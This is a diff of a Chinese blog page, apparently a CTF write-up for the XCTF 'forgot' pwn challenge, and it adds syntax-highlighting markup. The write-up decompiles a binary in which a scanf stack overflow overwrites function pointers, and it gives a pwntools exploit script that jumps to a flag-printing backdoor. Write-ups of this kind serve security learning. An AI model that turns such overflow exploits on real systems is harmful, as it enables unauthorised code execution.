@@ -6,7 +6,8 @@
     <meta charset="utf-8">
     <meta name="keywords" content="xctf-challege-forgot, Matrix">
     <meta name="description" content="1：checksechunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot
-[*] &amp;#39;/home/hunter/PWN/XCTF/xctf_challenge/forgot&amp;">
+[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/forgot&#39;
+   ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -29,7 +30,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -399,14 +400,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.8k
+                        1.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        8 分
+                        7 分
                     </div>
                     
                 
@@ -422,202 +423,212 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot
-[*] &#39;/home/hunter/PWN/XCTF/xctf_challenge/forgot&#39;
+                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/forgot'</span>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8048000)</code></pre><p>只开了NX</p>
-<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre><code>main函数关键代码
-size_t v0; // ebx
-  char v2[32]; // [esp+10h] [ebp-74h]
-  int (*fun1)(); // [esp+30h] [ebp-54h]  #显然这是一串指针数组，指向函数
-  int (*fun2)(); // [esp+34h] [ebp-50h]
-  int (*fun3)(); // [esp+38h] [ebp-4Ch]
-  int (*v6)(); // [esp+3Ch] [ebp-48h]
-  int (*v7)(); // [esp+40h] [ebp-44h]
-  int (*v8)(); // [esp+44h] [ebp-40h]
-  int (*v9)(); // [esp+48h] [ebp-3Ch]
-  int (*v10)(); // [esp+4Ch] [ebp-38h]
-  int (*v11)(); // [esp+50h] [ebp-34h]
-  int (*v12)(); // [esp+54h] [ebp-30h]
-  char s; // [esp+58h] [ebp-2Ch]
-  int v14; // [esp+78h] [ebp-Ch]
-  size_t i; // [esp+7Ch] [ebp-8h]
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre>
+<p>只开了NX</p>
+<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数关键代码
+size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>
+  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-74h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-54h]  #显然这是一串指针数组，指向函数</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun2<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-50h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-4Ch]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v6<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-48h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v7<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-44h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-40h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v9<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-3Ch]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-38h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-34h]</span>
+  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-30h]</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-2Ch]</span>
+  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+78h] [ebp-Ch]</span>
+  size_t i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-8h]</span>
 
-  v14 = 1;
-  fun1 = sub_8048604;  #将函数地址赋值给指针
-  fun2 = sub_8048618;
-  fun3 = sub_804862C;
-  v6 = sub_8048640;
-  v7 = sub_8048654;
-  v8 = sub_8048668;
-  v9 = sub_804867C;
-  v10 = sub_8048690;
-  v11 = sub_80486A4;
-  v12 = sub_80486B8;
+  v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  fun1 <span class="token operator">=</span> sub_8048604<span class="token punctuation">;</span>  #将函数地址赋值给指针
+  fun2 <span class="token operator">=</span> sub_8048618<span class="token punctuation">;</span>
+  fun3 <span class="token operator">=</span> sub_804862C<span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> sub_8048640<span class="token punctuation">;</span>
+  v7 <span class="token operator">=</span> sub_8048654<span class="token punctuation">;</span>
+  v8 <span class="token operator">=</span> sub_8048668<span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> sub_804867C<span class="token punctuation">;</span>
+  v10 <span class="token operator">=</span> sub_8048690<span class="token punctuation">;</span>
+  v11 <span class="token operator">=</span> sub_80486A4<span class="token punctuation">;</span>
+  v12 <span class="token operator">=</span> sub_80486B8<span class="token punctuation">;</span>
 
-  puts(&quot;Enter the string to be validate&quot;);
-  printf(&quot;&gt; &quot;);
-  fflush(stdout);
-  __isoc99_scanf(&quot;%s&quot;, v2);   #溢出点函数，没有限制输入的大小
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>   #溢出点函数，没有限制输入的大小
 
-   for ( i = 0; ; ++i )
-  {
-    v0 = i;
-    if ( v0 &gt;= strlen(v2) )
-      break;
-    switch ( v14 )
-    {
-      case 1:
-        if ( sub_8048702(v2[i]) )   #里面的函数是来对单个字符进行判别的，比较复杂，但是能搞懂逻辑顺序。
-          v14 = 2;
-        break;
-      case 2:
-        if ( v2[i] == &#39;@&#39; )
-          v14 = 3;
-        break;
-      case 3:
-        if ( sub_804874C(v2[i]) )         #里面的函数是来对单个字符进行判别
-          v14 = 4;
-        break;
-      case 4:
-        if ( v2[i] == &#39;.&#39; )
-          v14 = 5;
-        break;
-      case 5:
-        if ( sub_8048784(v2[i]) )         #里面的函数是来对单个字符进行判别
-          v14 = 6;
-        break;
-      case 6:
-        if ( sub_8048784(v2[i]) )      
-          v14 = 7;
-        break;
-      case 7:
-        if ( sub_8048784(v2[i]) )
-          v14 = 8;
-        break;
-      case 8:
-        if ( sub_8048784(v2[i]) )
-          v14 = 9;
-        break;
-      case 9:
-        v14 = 10;
-        break;
-      default:
-        continue;
-    }
-  }
-  (*(&amp;fun1 + --v14))();   #跳转到指针数组指向特定函数
+   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    v0 <span class="token operator">=</span> i<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v14 <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048702</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #里面的函数是来对单个字符进行判别的，比较复杂，但是能搞懂逻辑顺序。
+          v14 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span> <span class="token punctuation">)</span>
+          v14 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_804874C</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别
+          v14 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token punctuation">)</span>
+          v14 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别
+          v14 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      
+          v14 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+          v14 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+          v14 <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">9</span><span class="token punctuation">:</span>
+        v14 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">default</span><span class="token punctuation">:</span>
+        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fun1 <span class="token operator">+</span> <span class="token operator">--</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #跳转到指针数组指向特定函数
 
   main函数之外：  后门，这个函数名和前面的混在一起我一开始都没找到
-  int sub_80486CC()
-{
-  char s; // [esp+1Eh] [ebp-3Ah]
+  <span class="token keyword">int</span> <span class="token function">sub_80486CC</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-3Ah]</span>
 
-  snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);
-  return system(&amp;s);
-}</code></pre><p>snprintf函数收录</p>
+  <span class="token function">snprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token string">"cat %s"</span><span class="token punctuation">,</span> <span class="token string">"./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>snprintf函数收录</p>
 <h2 id="3：分析"><a href="#3：分析" class="headerlink" title="3：分析"></a>3：分析</h2><p>首先由于存在栈溢出，且数组v2下面的都是函数指针那我们就可以控制fun1<del>fun3，以及v6</del>v12的函数指针，还有v14。<br>有后门，那么我们只要想到如何控制程序流程跳转到后门即可。<br>在for循环语句中，会根据数组v2中的字符来改变v14的大小，跳出循环后到这个语句：(*(&amp;fun1 + –v14))() 显然是执行指针所指向的函数。整个过程&amp;fun1不变，变的只有v14那么我们可以设计payload使得v14的变化在我们可以预测。那么就要好好分析switch case中的语句。<br>我们进入第一个判断函数sub_8048702：</p>
 <pre><code>_BOOL4 __cdecl sub_8048702(char a1)
 {
   return a1 &gt; &#39;`&#39; &amp;&amp; a1 &lt;= &#39;z&#39; || a1 &gt; &#39;/&#39; &amp;&amp; a1 &lt;= &#39;9&#39; || a1 == &#39;_&#39; || a1 == &#39;-&#39; || a1 == &#39;+&#39; || a1 == &#39;.&#39;;// A~Z ：65~90   \xcc\x86\x04\x08
 }</code></pre><p>说实话第一眼看到这个鬼东西我是真的不想去分析它的逻辑，但是没办法，做生意又不会做。<br>&amp;&amp;  的优先级比 ||高  俩个都是从左到右。第一个&amp;&amp;最先计算，第一个||是最后运算，第二个&amp;&amp;第二运算  其他|| 从左到右。<br>因为第二个||是最后运算的，所以第一个&amp;&amp;运算结果是1那整体就是1. 为了不使v14有过多改变我们想办法构造的输入使这个整体为0.<br>发现没有对大写字母的判断所以padding可以用A。<br>仔细观察下面的判断，结合第一个判断我们知道只要payload里面没有@，v14就不可能大于3.<strong>所以程序流程只能最后执行&amp;fun1上面的函数，或是&amp;fun1+1上面的函数，这里需要对&amp;fun1+1和fun+1说明一下</strong></p>
-<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre><code>#include&lt;stdio.h&gt;
-int main()
-{
-    int (*fp[10])();
-    fp[0] = main;
-    fp[1] = main;
+<h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>
+    fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>
 
-    printf(&quot;%p\n&quot;,fp[0]);
-    printf(&quot;%p\n&quot;,fp[0]+1);
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    printf(&quot;%d\n&quot;,sizeof(fp[0]));
-    printf(&quot;%p\n&quot;,&amp;fp[0]);
-    printf(&quot;%p\n&quot;,&amp;fp[0]+1);
-    printf(&quot;%p\n&quot;,&amp;fp[1]);
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 
-    return 0;
-}</code></pre><p>运行结果</p>
-<pre><code>0000000000401530
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>运行结果</p>
+<pre class=" language-bash"><code class="language-bash">0000000000401530
 0000000000401531
 8
 000000000062FDD0
 000000000062FDD8
-000000000062FDD8</code></pre><p>fp是一个指针放入了main函数的地址。我们直接输出fp时输出了它的值，也就是main函数地址，对其+1再输出可以看到其输出也仅仅是+1（数值+1）<br>不过我输出fp的地址&amp;fp，再输出其地址+1的结果，可以看到变动了0x8，也恰好等于下一个指针的地址。并不是简单+1。<strong>所以对于地址（&amp;取地址，操作目标是地址）那就是正真的地址+1到下一个地址。</strong><br><strong>回到&amp;fun+1 那么这将指向下一个函数，即fun2 = sub_8048618。</strong></p>
+000000000062FDD8</code></pre>
+<p>fp是一个指针放入了main函数的地址。我们直接输出fp时输出了它的值，也就是main函数地址，对其+1再输出可以看到其输出也仅仅是+1（数值+1）<br>不过我输出fp的地址&amp;fp，再输出其地址+1的结果，可以看到变动了0x8，也恰好等于下一个指针的地址。并不是简单+1。<strong>所以对于地址（&amp;取地址，操作目标是地址）那就是正真的地址+1到下一个地址。</strong><br><strong>回到&amp;fun+1 那么这将指向下一个函数，即fun2 = sub_8048618。</strong></p>
 <p>所以我们要么覆盖fun1，要么覆盖fun2.用后门地址<br>payload = ‘A’*0x24 + p32(0x080486CC)<br>这里我打算覆盖到fun2，因为p32(0x080486CC)（这个东西经过判断函数后是会让v14变成2的,反正我当时是这么想的)</p>
-<pre><code>&gt;&gt;&gt; p32(0x080486CC) 
-&#39;\xcc\x86\x04\x08&#39;
-&gt;&gt;&gt;</code></pre><p>自己写一个一模一样的判断函数然后输入这一串字符你就会发现会使if成立。然后v14==2 并且一直等于2 </p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> p32<span class="token punctuation">(</span>0x080486CC<span class="token punctuation">)</span> 
+<span class="token string">'\xcc\x86\x04\x08'</span>
+<span class="token operator">>></span><span class="token operator">></span></code></pre>
+<p>自己写一个一模一样的判断函数然后输入这一串字符你就会发现会使if成立。然后v14==2 并且一直等于2 </p>
 <p>那么(*(&amp;fun1 + –v14))() 就会指向fun2.</p>
-<h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><pre><code>from pwn import*
-context.log_level = &#39;debug&#39;
+<h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 
-#sh = remote(&#39;220.249.52.133&#39;,40479)
-sh = process(&#39;./forgot&#39;)
+<span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>
 
-sh.recv()
-sh.sendline(&#39;yh&#39;)
-sh.recv()
-#0x080486cc door
-payload = &#39;A&#39;*36 + p32(0x080486cc)
-print payload
-#gdb.attach(sh)
-sh.sendline(payload)
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#0x080486cc door</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> payload
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p><strong><em>但是很可惜，我的分析又是错的（日了狗了，很操蛋）</em></strong></p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><strong><em>但是很可惜，我的分析又是错的（日了狗了，很操蛋）</em></strong></p>
 <h2 id="5：探究"><a href="#5：探究" class="headerlink" title="5：探究"></a>5：探究</h2><p>我觉的思路绝对没问题，折腾了好久发现问题出在pwntools上。<br>看看我的一个程序：</p>
-<pre><code>#include&lt;stdio.h&gt;
-int main()
-{
-    char a1[100]={&#39;\x00&#39;};
-    printf(&quot;%p\n&quot;,a1);
-    printf(&quot;%p\n&quot;,a1+1);
-    scanf(&quot;%s&quot;,a1);
-    for(int i=0;i&lt;sizeof(a1);i++){
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'\x00'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 
-        if(a1[i] &gt; 96 &amp;&amp; a1[i] &lt;= 122 || a1[i] &gt; &#39;/&#39; &amp;&amp; a1[i] &lt;= &#39;9&#39; || a1[i] == &#39;_&#39; || a1[i] == &#39;-&#39; || a1[i] == &#39;+&#39; || a1[i] == &#39;.&#39;){
-            printf(&quot;work!!!&quot;);
-        }
-        else{
-            printf(&quot;fail!!!&quot;);
-        }
-    }
+        <span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'9'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"work!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
 
-    return 0;
-}
-没错我会输入p32(0x080486CC)具体内容，然后看看到底会判断结果是什么</code></pre><pre><code>In [4]: payload
-Out[4]: &#39;\xcc\x86\x04\x08&#39;</code></pre><p>首先我直接输入\xcc\x86\x04\x08：<br><img src="https://s1.ax1x.com/2020/07/16/UrhfSI.png" alt=""><br>发现确实如我上面所说，会判断为正确（work）</p>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
